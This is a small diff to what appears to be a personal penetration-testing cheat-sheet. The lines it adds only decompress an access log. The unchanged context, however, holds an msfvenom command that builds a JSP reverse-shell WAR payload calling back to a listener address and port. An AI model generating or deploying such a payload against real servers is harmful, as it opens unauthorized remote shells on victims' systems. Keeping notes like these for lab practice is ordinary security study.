@@ -451,3 +451,6 @@ cat extract.html | grep -i Author | cut -d ":" -f 2 | sort -u
 ******************************************msfvenom****************************************************************
 war
 msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.27 lport=4447 -f war > diego.war
+****************************************compresores*************************************************************
+extraer
+gunzip access.log.txt.gz
